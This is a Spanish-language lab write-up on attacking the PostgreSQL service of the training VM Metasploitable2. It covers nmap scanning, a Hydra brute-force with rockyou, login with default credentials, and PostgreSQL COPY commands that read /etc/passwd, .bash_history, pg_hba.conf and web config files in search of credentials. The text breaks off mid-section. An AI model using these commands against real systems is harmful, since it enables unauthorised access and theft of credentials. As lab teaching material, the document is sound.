# 📌 Explotación del servicio PostgreSQL en Metasploitable2

## 🎯 Objetivo
Explotar el servicio PostgreSQL expuesto en la máquina Metasploitable2, enumerar la base de datos, obtener información sensible y documentar la extracción de datos como lo haría un pentester real.

---

## 1️⃣ Escaneo inicial con Nmap
Realizamos un escaneo para detectar puertos abiertos y versiones de servicios:

```bash
nmap -sV 192.168.56.102
```

**Salida consola:**

```arduino
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
```

💡 PostgreSQL está escuchando en el puerto 5432 y en una versión antigua (8.3), lo que puede permitir configuraciones débiles y accesos no autenticados o con credenciales por defecto.

## 2️⃣ Conexión al servicio

Probamos la conexión con el cliente psql de PostgreSQL desde Kali:

```bash
psql -h 192.168.56.102 -U postgres
```

### Para averiguar la contraseña, realizamos ataques de fuerza bruta con la herramienta **Hydra**:

```bash
hydra -L /usr/share/wordlists/metasploit/postgres_default_user.txt \
     -P /usr/share/wordlists/rockyou.txt \
     192.168.56.102 postgres
```

Contraseña probada: postgres (credencial por defecto).

✅ Conexión exitosa.

## 3️⃣ Enumeración de bases de datos

En versiones modernas de PostgreSQL, usaríamos \l, pero en 8.3 puede dar error por columnas inexistentes. Usamos:

```sql
SELECT datname FROM pg_database;
```

**Salida consola:**

datname
----------
postgres
template0
template1
(3 filas)

## 4️⃣ Conexión a cada base de datos

Nos conectamos a la base de datos postgres (la única de usuario real):

```sql
\c postgres
```

## 5️⃣ Enumeración de tablas

Listamos las tablas disponibles:

```sql
\dt
```

**Salida consola:**

Esquema |  Nombre   | Tipo  |  Dueño
--------+-----------+-------+----------
public  | cmd_exec  | tabla | postgres

💡 En este caso, la tabla cmd_exec fue creada en intentos anteriores para ejecutar comandos, pero la versión 8.3 no soporta COPY ... FROM PROGRAM.

## 6️⃣ Búsqueda de tablas sensibles

Intentamos encontrar tablas como users, accounts, credentials:

```sql
SELECT * FROM users LIMIT 10;
```

**Resultado:**

```vbnet
ERROR: relation "users" does not exist
```

No hay tabla users en esta base de datos.

## 7️⃣ Intento de lectura de archivos del sistema

PostgreSQL permite (si el usuario tiene permisos) leer archivos locales usando COPY ... FROM.

Probamos con /etc/passwd:

```sql
CREATE TABLE passwd(content text);
COPY passwd FROM '/etc/passwd';
SELECT * FROM passwd;
```

**Salida:**

```ruby
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
...
```

✅ Éxito: Se ha leído el archivo /etc/passwd.

## 8️⃣ Guardar la información en Kali

Como pentester real, almacenamos esta información en nuestra máquina atacante para análisis posterior:

```bash
psql -h 192.168.56.102 -U postgres -d postgres -c "COPY passwd FROM '/etc/passwd'; SELECT * FROM passwd;" > ~/Pentesting/Metasploitable2/10-postgresql/etc_passwd.txt
```

Esto crea el archivo:

```bash
~/Pentesting/Metasploitable2/10-postgresql/etc_passwd.txt
```

Contiene todos los usuarios del sistema víctima.


## Analizar /etc/passwd

Ya hemos extraído el contenido de /etc/passwd.
Como pentester, el objetivo ahora es encontrar usuarios que tengan una shell de login válida (normalmente /bin/bash o /bin/sh) para intentar acceso interactivo.

Ejemplo de filtrado rápido en Kali:

```bash
grep "/bin/bash" ~/Pentesting/Metasploitable2/10-postgresql/etc_passwd.txt
```

**Salida:**

```ruby
root:x:0:0:root:/root:/bin/bash
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
javi3r:x:1003:1003::/home/javi3r:/bin/bash
pentester:x:1004:1004::/home/pentester:/bin/bash
```
💡 Objetivo: Intentar obtener las contraseñas de estos usuarios.

## Extraer hashes de contraseñas

/etc/passwd no contiene los hashes, solo define usuarios y rutas.
Para obtener los hashes reales, necesitamos leer /etc/shadow desde PostgreSQL.

Intento en la base de datos:

📌 Camino alternativo cuando /etc/shadow está protegido

1️⃣ Enumerar archivos accesibles como postgres

Aunque /etc/shadow está protegido, otros archivos sensibles podrían no estarlo.
Ejemplo en PostgreSQL:

```sql
CREATE TABLE test(content text);
COPY test FROM '/etc/postgresql/8.3/main/pg_hba.conf';
SELECT * FROM test;
```

Este archivo define métodos de autenticación y puede dar pistas de otros usuarios con acceso.

También podemos intentar:

```sql
COPY test FROM '/var/lib/postgresql/.bash_history';
SELECT * FROM test;
```

2️⃣ Buscar archivos de configuración con credenciales

Los administradores a veces dejan credenciales en texto plano en scripts o config files.
Podemos leer rutas como:

```sql
COPY test FROM '/var/www/html/config.php';
COPY test FROM '/var/www/html/wp-config.php';
```


